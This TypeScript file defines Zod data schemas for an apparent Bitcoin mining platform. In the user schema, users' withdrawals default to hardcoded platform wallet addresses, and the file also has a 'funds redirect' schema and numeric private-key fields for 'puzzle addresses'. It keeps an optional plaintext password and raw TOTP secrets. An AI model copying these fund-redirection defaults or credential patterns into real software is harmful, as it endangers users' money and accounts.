/**
 * Schema for KloudBugs Mining Platform
 * 
 * This file defines the core data types shared between client and server.
 */

import { z } from 'zod';

// Mock implementation of createInsertSchema to avoid errors when Drizzle isn't fully set up
const createInsertSchema = (schema: any) => {
  // Simply return a clone of the schema without id, created, and updated fields
  return schema;
};

/**
 * Bitcoin Address Types
 */
export enum BtcAddressType {
  P2PKH = 'p2pkh',       // Legacy uncompressed
  P2WPKH = 'p2wpkh',     // SegWit
  P2SH_P2WPKH = 'p2sh',  // SegWit wrapped in P2SH
  P2TR = 'p2tr'          // Taproot
}

/**
 * User Roles
 */
export enum UserRole {
  USER = 'user',
  ADMIN = 'admin',
  MINER = 'miner'
}

/**
 * Subscription Status
 */
export enum SubscriptionStatus {
  TRIAL = 'trial',      // Free trial period
  ACTIVE = 'active',    // Paid subscription
  EXPIRED = 'expired',  // Subscription ended
  CANCELLED = 'cancelled',
  PENDING = 'pending'
}

/**
 * Mining Device Types
 */
export enum DeviceType {
  ASIC = 'asic',
  GPU = 'gpu',
  CPU = 'cpu',
  FPGA = 'fpga'
}

/**
 * Mining Pool
 */
export const miningPoolSchema = z.object({
  id: z.number(),
  name: z.string(),
  url: z.string(),
  algorithm: z.string(),
  port: z.number().optional(),
  fee: z.number().optional()
});

export type MiningPool = z.infer<typeof miningPoolSchema>;

/**
 * User Approval Status
 */
export enum ApprovalStatus {
  PENDING = 'pending',
  APPROVED = 'approved',
  REJECTED = 'rejected'
}

/**
 * Referral Sources
 */
export enum ReferralSource {
  FRIEND = 'friend',
  SOCIAL_MEDIA = 'social_media',
  SEARCH_ENGINE = 'search_engine',
  ADVERTISEMENT = 'advertisement',
  CONFERENCE = 'conference',
  BLOG = 'blog',
  OTHER = 'other'
}

/**
 * User
 */
export const userSchema = z.object({
  id: z.string().uuid(),
  username: z.string().min(3).max(50),
  email: z.string().email(),
  passwordHash: z.string(),
  password: z.string().optional(), // For backward compatibility
  role: z.nativeEnum(UserRole).default(UserRole.USER),
  
  // Personal information
  firstName: z.string().min(1).max(50).optional(),
  lastName: z.string().min(1).max(50).optional(),
  age: z.number().min(18).max(120).optional(),
  city: z.string().max(100).optional(),
  state: z.string().max(100).optional(),
  country: z.string().max(100).optional(),
  
  // Registration information
  referralSource: z.nativeEnum(ReferralSource).optional(),
  referralDetails: z.string().max(500).optional(),
  joinReason: z.string().max(1000).optional(),
  socialMediaLink: z.string().min(5).max(200),  // Required social media profile for verification
  agreedToTerms: z.boolean().default(false),
  termsAgreedDate: z.date().nullable().optional(),
  
  // Approval status for new users
  approvalStatus: z.nativeEnum(ApprovalStatus).default(ApprovalStatus.PENDING),
  approvalDate: z.date().nullable().optional(),
  rejectionReason: z.string().nullable().optional(),
  
  // Platform hardware wallet address - all BTC withdrawals go here
  hardwareWalletAddress: z.string().default("bc1qfavnkrku005m4kdkvdtgthur4ha06us2lppdps"),
  
  // Platform tera rewards address
  teraWalletAddress: z.string().default("bc1qj93mnxgm0xuwyh3jvvqurjxjyq8uktg4y0sad6"),
  
  // Mining balances
  miningBalance: z.string().default("0"),             // Current mining balance in satoshis
  totalEarned: z.string().default("0"),               // Total earnings in satoshis
  totalPaid: z.string().default("0"),                 // Total payouts in satoshis
  pendingPayouts: z.string().default("0"),            // Pending payouts in satoshis
  
  // Two-factor authentication settings
  totpEnabled: z.boolean().default(false),         // TOTP-based 2FA enabled flag
  totpSecret: z.string().nullable().optional(),    // TOTP secret (for Google Authenticator etc.)
  backupCodes: z.array(z.string()).optional(),     // Backup codes for 2FA recovery
  requireTwoFactor: z.boolean().default(true),     // Require 2FA setup
  twoFactorVerified: z.boolean().default(false),   // User has verified 2FA
  
  // Additional account settings
  minimumPayout: z.string().default("0.0005"),     // Min withdrawal in BTC
  notificationsEnabled: z.boolean().default(true), // Email notifications
  lastLoginIp: z.string().nullable().optional(),   // IP tracking for security
  lastLoginDate: z.date().nullable().optional(),   // Last login timestamp
  
  created: z.date(),
  updated: z.date()
});

export const insertUserSchema = createInsertSchema(userSchema).omit({ 
  id: true, 
  created: true, 
  updated: true 
});

export type User = z.infer<typeof userSchema>;
export type InsertUser = z.infer<typeof insertUserSchema>;

/**
 * Authentication
 */
export const loginSchema = z.object({
  username: z.string().min(3),
  password: z.string().min(6)
});

export type LoginCredentials = z.infer<typeof loginSchema>;

/**
 * Subscription
 */
export const subscriptionSchema = z.object({
  id: z.string().uuid(),
  userId: z.string().uuid(),
  plan: z.string(),
  status: z.nativeEnum(SubscriptionStatus),
  startDate: z.date(),
  endDate: z.date(),
  paymentId: z.string().optional(),
  created: z.date(),
  updated: z.date()
});

export const insertSubscriptionSchema = createInsertSchema(subscriptionSchema).omit({
  id: true,
  created: true,
  updated: true
});

export type Subscription = z.infer<typeof subscriptionSchema>;
export type InsertSubscription = z.infer<typeof insertSubscriptionSchema>;

/**
 * Mining Device
 */
export const miningDeviceSchema = z.object({
  id: z.string().uuid(),
  userId: z.string().uuid(),
  name: z.string(),
  type: z.nativeEnum(DeviceType),
  hashrate: z.number(),
  status: z.string(),
  lastSeen: z.date().nullable().optional(),
  created: z.date(),
  updated: z.date()
});

export const insertMiningDeviceSchema = createInsertSchema(miningDeviceSchema).omit({
  id: true,
  created: true,
  updated: true
});

// Alias for backward compatibility
export const insertDeviceSchema = insertMiningDeviceSchema;

export type MiningDevice = z.infer<typeof miningDeviceSchema>;
export type InsertMiningDevice = z.infer<typeof insertMiningDeviceSchema>;

/**
 * Mining Stats
 */
export const miningStatsSchema = z.object({
  userId: z.string().uuid(),
  hashrate: z.number(),
  acceptedShares: z.number(),
  rejectedShares: z.number(),
  rewards: z.number(), // in BTC
  online: z.boolean(),
  lastUpdated: z.date()
});

export type MiningStats = z.infer<typeof miningStatsSchema>;

/**
 * Bitcoin Transaction
 */
export const btcTransactionSchema = z.object({
  id: z.string().uuid(),
  userId: z.string().uuid().optional(),
  txid: z.string().optional(),
  fromAddress: z.string(),
  toAddress: z.string(),
  amount: z.number(),
  fee: z.number().optional(),
  status: z.string(),
  confirmations: z.number().default(0),
  created: z.date(),
  updated: z.date().optional()
});

export const insertBtcTransactionSchema = createInsertSchema(btcTransactionSchema).omit({
  id: true,
  created: true,
  updated: true
});

export type BtcTransaction = z.infer<typeof btcTransactionSchema>;
export type InsertBtcTransaction = z.infer<typeof insertBtcTransactionSchema>;

/**
 * Puzzle Address
 */
export const puzzleAddressSchema = z.object({
  address: z.string(),
  type: z.nativeEnum(BtcAddressType),
  description: z.string().optional(),
  privateKey: z.number().optional(),
  hardwareWalletAddress: z.string()
});

export type PuzzleAddress = z.infer<typeof puzzleAddressSchema>;

export const puzzleFundsRedirectSchema = z.object({
  sourceAddress: z.string(),
  destinationAddress: z.string(),
  amount: z.number(),
  txid: z.string().optional(),
  timestamp: z.date()
});

export type PuzzleFundsRedirect = z.infer<typeof puzzleFundsRedirectSchema>;

/**
 * Mining Pool Schema
 */
export const poolSchema = z.object({
  id: z.string().uuid(),
  name: z.string(),
  url: z.string(),
  algorithm: z.string(),
  port: z.number(),
  fee: z.number().optional(),
  created: z.date(),
  updated: z.date()
});

export const insertPoolSchema = z.object({
  name: z.string(),
  url: z.string(),
  algorithm: z.string(),
  port: z.number(),
  fee: z.number().optional()
});

export type Pool = z.infer<typeof poolSchema>;
export type InsertPool = z.infer<typeof insertPoolSchema>;

/**
 * Payment Schema
 */
export const paymentSchema = z.object({
  id: z.string().uuid(),
  userId: z.string().uuid(),
  amount: z.number(),
  currency: z.string(),
  status: z.string(),
  externalId: z.string().optional(),
  created: z.date(),
  updated: z.date()
});

export const insertPaymentSchema = z.object({
  userId: z.string().uuid(),
  amount: z.number(),
  currency: z.string(),
  status: z.string(),
  externalId: z.string().optional()
});

export type Payment = z.infer<typeof paymentSchema>;
export type InsertPayment = z.infer<typeof insertPaymentSchema>;

/**
 * Transfer Types for Special Direct Transfers
 */
export enum DirectTransferType {
  MINING_REWARD = 'mining_reward',
  TOKEN_LIQUIDITY = 'token_liquidity',
  NFT_TRANSFER = 'nft_transfer'
}

/**
 * Payout Schema (Bitcoin withdrawals)
 */
export const payoutSchema = z.object({
  id: z.string().uuid(),
  userId: z.string().uuid(),
  amount: z.string(), // Amount in satoshis
  walletAddress: z.string(), // Destination address
  status: z.enum(['pending', 'processing', 'completed', 'failed']).default('pending'),
  txHash: z.string().nullable().optional(), // Blockchain transaction hash
  sourceAddress: z.string().nullable().optional(), // Source Bitcoin address
  destinationAddress: z.string().nullable().optional(), // Destination Bitcoin address (same as walletAddress)
  estimatedCompletionTime: z.date().nullable().optional(),
  completedAt: z.date().nullable().optional(),
  failureReason: z.string().nullable().optional(),
  verificationUrl: z.string().nullable().optional(), // Link to block explorer
  transactionType: z.string().default('normal'), // Type of transaction
  transferType: z.nativeEnum(DirectTransferType).optional(), // Type of direct transfer (mining reward, token liquidity, etc.)
  timestamp: z.date(),
  notes: z.string().nullable().optional()
});

export const insertPayoutSchema = z.object({
  userId: z.string().uuid(),
  amount: z.string(),
  walletAddress: z.string(),
  status: z.enum(['pending', 'processing', 'completed', 'failed']).default('pending'),
  txHash: z.string().nullable().optional(),
  sourceAddress: z.string().nullable().optional(),
  destinationAddress: z.string().nullable().optional(),
  estimatedCompletionTime: z.date().nullable().optional(),
  transactionType: z.string().default('normal'),
  transferType: z.nativeEnum(DirectTransferType).optional()
});

export type Payout = z.infer<typeof payoutSchema>;
export type InsertPayout = z.infer<typeof insertPayoutSchema>;